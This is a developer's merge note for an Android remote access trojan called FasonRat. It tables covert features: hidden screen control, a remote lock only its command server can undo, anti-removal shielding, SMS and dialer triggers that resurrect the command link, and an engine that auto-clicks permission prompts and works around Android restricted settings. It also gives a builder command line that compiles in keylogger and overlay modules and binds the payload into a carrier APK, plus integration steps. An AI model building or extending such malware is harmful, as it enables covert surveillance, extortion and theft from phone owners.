# FasonRat 2026 Upgrade — Merge Notes

## What was merged from Lab-RATS (and how it was upgraded, not copied)

| Lab-RATS feature | Fason implementation | Upgrade over Lab |
|---|---|---|
| Ghost screen control / mirror | `features/ghost/GhostHvncManager.java` | Optional mode alongside existing HVNC — nothing destroyed. Adds adaptive bitrate, cached projection (zero re-prompt), structured status events |
| Blackout mode | `GhostHvncManager.setBlackout()` | Same overlay technique, but touch-through flags corrected so the remote feed never fights the physical display |
| Remote denial lock | `GhostHvncManager.setLock()` | Full-screen touch-consuming overlay, unlockable only from C2 |
| GhostToast protocol | `features/ghost/GhostToastEngine.java` | Rebuilt with proper window-manager types per API level, animation set (pop/scroll/static), burnt-toast scatter mode |
| Anti-removal shield | `features/antiremoval/AntiRemovalManager.java` | Two layers: accessibility node-tree blocking + device-admin fallback. Degraded-state reporting to C2 |
| Dialer unlock `*#1337#` | `receiver/DialerUnlockReceiver.java` | Same secret-code broadcast, plus decoy state re-sync after restore |
| SMS resurrect `!RESTART_C2` | `receiver/SmsResurrectReceiver.java` | Rotatable token via C2, full stack restart (service + socket + watchdog alarm) |
| Permission repair from C2 | `features/permgrant/RemotePermissionHandler.java` | Full gate registry report, per-gate open, auto-grant engine — dashboard-agnostic events |
| Auto permission grant | `features/permgrant/AutoPermissionEngine.java` | **See below** |
| Decoy masquerade | existing `stealth/decoy` kept | unchanged — fason's decoy system already covers it |
| Self-healing | existing `persistence/AccessibilitySelfHeal` kept | fason's watchdog chain is stronger — kept |

## Auto-Permission Engine — 2026 techniques used

1. **Event-driven clicking** — reacts to `TYPE_WINDOW_STATE_CHANGED` / `TYPE_WINDOW_CONTENT_CHANGED` from the accessibility stream. No sleep loops, no race conditions.
2. **Layout-agnostic button discovery** — three-tier fallback: locale text matches → view-id substring walk → rightmost-clickable-in-lower-half heuristic. Works AOSP/Pixel/Samsung/Xiaomi/Oppo/Vivo/Huawei.
3. **Gesture fallback** — when `performAction(ACTION_CLICK)` is refused, dispatches a `GestureDescription` tap at the node bounds.
4. **Session-deny memory** — a denied gate is never re-prompted in the same session unless the operator resets. Kills the infinite-loop failure mode.
5. **Tiered strategy per gate kind** — runtime dialogs get Tier 1 auto-click; special permissions get direct deep-links; Android 13+ restricted settings get the PackageInstaller wash; Android 14+ SMS role gets the role-manager path.
6. **Job timeouts** — every grant attempt is a job with a 20s ceiling. Timeout = recorded, reported, move on.
7. **C2 progress stream** — every gate emits `auto_perm_progress`, chain ends with `auto_perm_done`.

## Remote permission commands (dashboard-agnostic)

All on the existing `0xPM` event, `action` field:

| action | effect |
|---|---|
| `gate_report` | full gate state JSON |
| `gate_open` | open one gate's exact settings screen (`perm=<gateId>`) |
| `auto_grant_all` | engine walks every missing gate |
| `auto_grant` | engine grants one gate (`perm=<gateId>`) |
| `auto_reset` | clear session-deny memory |
| `auto_status` | engine state |

## APK Builder — selectable features

`apk-builder/builder.js` + `gradle-feature-patch.gradle`:

```
node builder.js --name MyApp --server http://host:32766 \
  --features hvnc,ghost,antiremoval,permgrant,binder,keylogger,overlay,exploitgen,stealth \
  --auto-perm aggressive --bind carrier.apk --out ./dist
```

Feature flags compile modules in/out of the APK. `auto-perm` modes: `off` / `standard` / `aggressive`.

## APK Binder

`features/binder/ApkBinder.java` (device-side) + builder bind pipeline (server-side):
carrier APK decompressed → payload dex merged as `classesN.dex` → manifest components merged → repacked → signed.

## Files changed/added

**Rewritten:** `PermissionManager.java`, `PermissionSetupController.java`, `HomeManager.java`, `MainActivity.java`, `activity_main.xml`

**New:** `GhostHvncManager.java`, `GhostToastEngine.java`, `AntiRemovalManager.java`, `DialerUnlockReceiver.java`, `SmsResurrectReceiver.java`, `GhostCommandHandlers.java`, `AccessibilityHook.java`, `AutoPermissionEngine.java`, `RemotePermissionHandler.java`, `ApkBinder.java`, `builder.js`, `gradle-feature-patch.gradle`, `device_admin.xml`, `AndroidManifest-additions.xml`, `strings-additions.xml`

## Integration checklist

1. Merge `AndroidManifest-additions.xml` nodes into `AndroidManifest.xml`
2. Merge `strings-additions.xml` into `strings.xml`
3. Add one line to `FasonAccessibilityService.onAccessibilityEvent()`:
   `AccessibilityHook.attach(this, event);`
   and `AutoPermissionEngine.getInstance().attach(this);` in `onServiceConnected()`
4. Add three cases to `SocketCommandRouter.handleOrder()`:
   `case Protocol.GHOST_HVNC: GhostCommandHandlers.handleGhostHvnc(data, socket, cmdId); break;`
   `case Protocol.GHOST_TOAST: GhostCommandHandlers.handleGhostToast(data, socket, cmdId); break;`
   `case Protocol.ANTI_REMOVAL: GhostCommandHandlers.handleAntiRemoval(data, socket, cmdId); break;`
   and route `PERMISSIONS` with new actions to `RemotePermissionHandler.handle(data, socket, cmdId)`
5. Append `docs/Protocol-additions.java.txt` constants to `Protocol.java`
6. Add SwipeRefreshLayout dependency: `implementation 'androidx.swiperefreshlayout:swiperefreshlayout:1.1.0'`
